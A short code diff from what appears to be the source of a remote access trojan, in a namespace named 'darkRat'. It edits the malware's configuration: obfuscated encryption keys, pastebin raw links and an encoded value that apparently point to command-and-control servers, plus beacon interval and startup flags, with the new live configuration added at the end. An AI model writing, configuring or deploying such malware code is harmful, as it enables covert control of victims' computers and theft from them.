@@ -80,29 +80,27 @@ namespace darkRat
 			
 	
 			/*
-			return config(OBFUSCATE("S#q-}=6{)BuEV[GDeZy>~M5D/P&Q}6>"),
-				OBFUSCATE("http://pastebin.com/raw/QEcHnGb1"), //Debug //http://pastebin.com/raw/wJJPteV2
+			return config(OBFUSCATE("IQHN6ag+L3gZd0h0fLh679uQ7L4zUlyVM0jY"),
+				OBFUSCATE("http://pastebin.com/raw/47D2rxaS"), //Debug //http://pastebin.com/raw/wJJPteV2
 				OBFUSCATE("3mCUq1z"),
-				OBFUSCATE("false"),
-				OBFUSCATE("5"),
-				OBFUSCATE("false"),
-				OBFUSCATE("main"),
-				OBFUSCATE("SUq1rx"),
-				{}
-			);
-
-		
-			return config(OBFUSCATE("wzXnjDj3i0pLHGhZJGMAkAdKLCpCDygH"),
-				OBFUSCATE("http://pastebin.com/raw/0K3X5Rs9"), //Debug //http://pastebin.com/raw/wJJPteV2
-				OBFUSCATE("3mCUq1b"),
 				OBFUSCATE("true"),
 				OBFUSCATE("600"),
 				OBFUSCATE("true"),
 				OBFUSCATE("main"),
-				OBFUSCATE("SUq1rx"),
-				{}
+				OBFUSCATE("SUq1rx")
 			);
-			*/
+	*/
+
+			return config(OBFUSCATE("godbuntusnetisbestuknowishegodtu"),
+				OBFUSCATE("P9qpEUWRPpy/X1nMoQCI5p4Y01fWcD26WPkA=="), //Debug //http://pastebin.com/raw/wJJPteV2
+				OBFUSCATE("8jCPd9d"),
+				OBFUSCATE("true"),
+				OBFUSCATE("600"),
+				OBFUSCATE("true"),
+				OBFUSCATE("main"),
+				OBFUSCATE("imgodbuntuimgodbecauseimgodbuntu")
+			);
+			
 		}
 	}
 }
